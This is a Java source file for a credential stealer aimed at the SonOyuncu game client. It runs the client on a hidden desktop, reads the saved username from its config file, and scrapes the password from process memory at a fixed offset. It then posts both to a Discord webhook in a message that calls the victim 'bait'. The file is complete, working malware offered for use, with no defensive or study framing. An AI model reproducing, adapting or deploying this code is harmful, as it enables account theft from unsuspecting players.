import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinDef.*;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import java.io.File;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class main {

    private static final String APP_DIR = System.getenv("APPDATA") + "\\" + ".sonoyuncu" + "\\";
    private static final String APP_PATH = APP_DIR + "sonoyuncuclient.exe";
    private static final String CONFIG_PATH = APP_DIR + "config.json";
    private static final String WEBHOOK_URL = "UR_WEBHOOK_URL";
    private static final Gson gson = new Gson();

    private final Kernel32Extended kernel32 = Kernel32Extended.INSTANCE;
    private final User32Extended user32 = User32Extended.INSTANCE;
    private HANDLE hiddenDesktop;
    private ProcessInfo processInfo;

    public static void main(String[] args) {
        if (new File(APP_PATH).exists()) {
            main extractor = new main();
            String[] credentials = extractor.extractAccount();
            if (credentials==null)
                return;
            
            sendWebhook(credentials[0], credentials[1]);
        } else {
            System.out.println("Application not found: " + APP_PATH);
        }
    }

    public interface User32Extended extends StdCallLibrary {
        User32Extended INSTANCE = Native.loadLibrary("user32", User32Extended.class);
        HANDLE CreateDesktopW(WString desktop, WString device, Pointer devmode, int flags, int access, WinBase.SECURITY_ATTRIBUTES attrs);
        boolean CloseDesktop(HANDLE desktop);
    }

    public interface Kernel32Extended extends StdCallLibrary {
        Kernel32Extended INSTANCE = Native.loadLibrary("kernel32", Kernel32Extended.class);
        boolean CreateProcessW(WString appName, WString cmdLine, WinBase.SECURITY_ATTRIBUTES procAttrs, WinBase.SECURITY_ATTRIBUTES threadAttrs, boolean inheritHandles, int flags, Pointer env, WString currDir, StartupInfoEx startupInfo, ProcessInfo procInfo);
        boolean ReadProcessMemory(HANDLE process, Pointer baseAddr, Memory buffer, int size, IntByReference bytesRead);
        HANDLE OpenProcess(int access, boolean inherit, int pid);
        boolean CloseHandle(HANDLE handle);
        boolean TerminateProcess(HANDLE process, int exitCode);
        HANDLE CreateToolhelp32Snapshot(int flags, int pid);
        boolean Module32FirstW(HANDLE snapshot, Tlhelp32.MODULEENTRY32W module);
        boolean Module32NextW(HANDLE snapshot, Tlhelp32.MODULEENTRY32W module);
    }

    public static class StartupInfoEx extends Structure {
        public DWORD cb = new DWORD(size());
        public WString lpReserved, lpDesktop, lpTitle;
        public DWORD dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public WORD wShowWindow, cbReserved2;
        public Pointer lpReserved2;
        public HANDLE hStdInput, hStdOutput, hStdError;
        public Pointer lpAttributeList;

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("cb", "lpReserved", "lpDesktop", "lpTitle", "dwX", "dwY", "dwXSize", "dwYSize",
                    "dwXCountChars", "dwYCountChars", "dwFillAttribute", "dwFlags", "wShowWindow",
                    "cbReserved2", "lpReserved2", "hStdInput", "hStdOutput", "hStdError", "lpAttributeList");
        }
    }

    public static class ProcessInfo extends Structure {
        public HANDLE hProcess, hThread;
        public int dwProcessId, dwThreadId;

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("hProcess", "hThread", "dwProcessId", "dwThreadId");
        }
    }

    private HANDLE createHiddenDesktop() {
        try {
            int access = 0x00000020 | 0x00000040 | 0x00000100 | 0x10000000;
            return user32.CreateDesktopW(new WString("HiddenDesktop"), null, null, 0, access, null);
        } catch (Exception ignored) {}
        return null;
    }

    private ProcessInfo launchApp() {
        try {
            StartupInfoEx startup = new StartupInfoEx();
            startup.lpDesktop = new WString("HiddenDesktop");
            startup.dwFlags = new DWORD(0x00000001);
            startup.wShowWindow = new WORD(0);
            ProcessInfo procInfo = new ProcessInfo();
            boolean success = kernel32.CreateProcessW(null, new WString(APP_PATH), null, null, false, 0x08000000, null, null, startup, procInfo);
            return success ? procInfo : null;
        } catch (Exception ignored) {}
        return null;
    }

    public String[] extractAccount() {
        try {
            hiddenDesktop = createHiddenDesktop();
            processInfo = launchApp();
            return processInfo != null ? readFromMemory(processInfo.dwProcessId) : null;
        } finally {
            cleanup();
        }
    }

    private String[] readFromMemory(int pid) {
        long timeout = System.currentTimeMillis() + 10000;
        while (System.currentTimeMillis() < timeout) {
            try {
                HANDLE process = kernel32.OpenProcess(0x0010 | 0x0400, false, pid);
                if (process == null) { Thread.sleep(100); continue; }
                long baseAddr = getBaseAddress(pid);
                if (baseAddr == 0) { kernel32.CloseHandle(process); Thread.sleep(100); continue; }
                JsonObject json = JsonParser.parseReader(new FileReader(CONFIG_PATH)).getAsJsonObject();
                String user = json.get("userName").getAsString();
                String pass = extractWithRegex(process, baseAddr + 0x1C6900, 100, "[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{1,128}");
                kernel32.CloseHandle(process);
                if (user != null && pass != null) return new String[]{user, pass};
            } catch (Exception ignored) {}
        }
        return null;
    }

    private String extractWithRegex(HANDLE process, long address, int size, String regex) {
        try {
            Memory buffer = new Memory(size);
            IntByReference read = new IntByReference();
            if (kernel32.ReadProcessMemory(process, new Pointer(address), buffer, size, read) && read.getValue() > 0) {
                String data = new String(buffer.getByteArray(0, read.getValue()), StandardCharsets.UTF_8).replace("\0", "");
                Matcher matcher = Pattern.compile(regex).matcher(data);
                return matcher.find() ? matcher.group() : null;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private long getBaseAddress(int pid) {
        try {
            HANDLE snapshot = kernel32.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPMODULE.intValue(), pid);
            if (snapshot == null) return 0;
            Tlhelp32.MODULEENTRY32W module = new Tlhelp32.MODULEENTRY32W();
            module.dwSize = new DWORD(module.size());
            while (kernel32.Module32FirstW(snapshot, module) || kernel32.Module32NextW(snapshot, module)) {
                if ("sonoyuncuclient.exe".equalsIgnoreCase(Native.toString(module.szModule))) {
                    kernel32.CloseHandle(snapshot);
                    return Pointer.nativeValue(module.modBaseAddr);
                }
            }
            kernel32.CloseHandle(snapshot);
            return 0;
        } catch (Exception ignored) {}
        return 0;
    }

    private void cleanup() {
        try {
            if (processInfo != null) {
                HANDLE proc = kernel32.OpenProcess(0x0001, false, processInfo.dwProcessId);
                if (proc != null) {
                    kernel32.TerminateProcess(proc, 0);
                    kernel32.CloseHandle(proc);
                }
                kernel32.CloseHandle(processInfo.hProcess);
                kernel32.CloseHandle(processInfo.hThread);
            }
            if (hiddenDesktop != null) user32.CloseDesktop(hiddenDesktop);
        } catch (Exception ignored) {}
    }

    public static boolean sendWebhook(String username, String password) {
        try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
            JsonObject payload = new JsonObject();
            payload.addProperty("username", "fantasy");
            JsonObject embed = new JsonObject();
            embed.addProperty("title", "SonOyuncu Account Stealer :dash:");
            embed.addProperty("color", 65505);
            embed.addProperty("description",
                    "a new bait has been spotted :woozy_face:\n\n" +
                            ":small_blue_diamond:Username **" + username + "**\n" +
                            ":small_blue_diamond:Password **" + password + "**");
            JsonObject thumbnail = new JsonObject();
            thumbnail.addProperty("url", "https://www.minotar.net/avatar/" + username);
            embed.add("thumbnail", thumbnail);
            JsonObject footer = new JsonObject();
            footer.addProperty("text", "github.com/fantasywastaken");
            footer.addProperty("icon_url", "https://avatars.githubusercontent.com/u/61884903");
            embed.add("footer", footer);
            JsonObject[] embeds = {embed};
            payload.add("embeds", gson.toJsonTree(embeds));
            HttpPost httpPost = new HttpPost(WEBHOOK_URL);
            httpPost.setHeader("Content-Type", "application/json");
            httpPost.setEntity(new StringEntity(gson.toJson(payload)));
            HttpResponse response = httpClient.execute(httpPost);
            return response.getStatusLine().getStatusCode() == 204;
        } catch (Exception ignored) {}
        return false;
    }
}
